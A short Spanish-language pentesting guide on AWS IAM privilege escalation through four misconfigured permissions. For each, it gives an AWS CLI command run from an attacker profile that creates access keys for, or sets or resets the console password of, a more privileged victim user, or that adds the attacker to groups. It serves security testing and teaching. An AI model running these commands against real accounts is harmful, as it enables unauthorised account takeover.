# Intro

Se basan en la mala configuración de permisos dados a un usuario permitiéndoles alterar permisos o configuraciones de otros usuarios.

# Tipos de permisos a ser abusados

|Permiso | Descripción |
|----|---|
|iam:CreateAccessKey | Permite a un usuario crear nuevas claves de acceso para una cuenta |
|iam:CreateLoginProfile | Habilita la creación de un perfil de inicio de sesión **para usuarios que no lo tienen**|
|iam:UpdateLoginProfile | Permite modificar el perfil de inicio de sesión a un usuario incluyendo la contraseña |
|iam:AddUserToGroup| Permite a un usuario agregarse a sí mismo o a otro a un grupo |


## iam:CreateAccessKey

Si un usuario sobre el que tenemos el control tiene asignada esta política y el campo **Resource** del statement se encuentra **apuntando a otro user con más privilegios o en wildcard**, podemos crear Access Keys para dichos usuarios y loguearnos con los mismos.

    aws iam create-access-key --user-name <usuario a impersonar> --profile <perfil_atacante>

## iam:CreateLoinProfile

Si un usuario sobre el que tenemos el control tiene asignada esta política y el campo **Resource** del statement se encuentra **apuntando a otro user con más privilegios o en wildcard**, podremos crear una contrasea para iniciar sesión desde la consola de AWS. No Funcionará si el user ya tiene un perfil de inicio.

    aws iam create-login-profile --user-name <victima> --password <contraseña> --no-password-reset-required --profile <perfil_atacante>

## iam:UpdateLoginProfile

Si un usuario sobre el que tenemos el control tiene asignada esta política y el campo **Resource** del statement se encuentra **apuntando a otro user con más privilegios o en wildcard** podemos cambiar la contraseña de inicio de sesión en la consola de AWS a otros usuarios.

    aws iam update-login-profile --user-name <victima> --password <contraseña> --no-password-reset-required --profile <perfil_atacante>

## iam:AddUserToGroup

Si un usuario sobre el que tenemos el control tiene asignada esta política y el campo **Resource** del statement se encuentra **apuntando a un grupo o en wildcard** podemos agregarnos a nosotros mismos o a otros usuarios a los grupos comprendidos.

    aws iam add-user-to-group --group-name <grupo> --user-name <user> --profile <perfil_atacante>
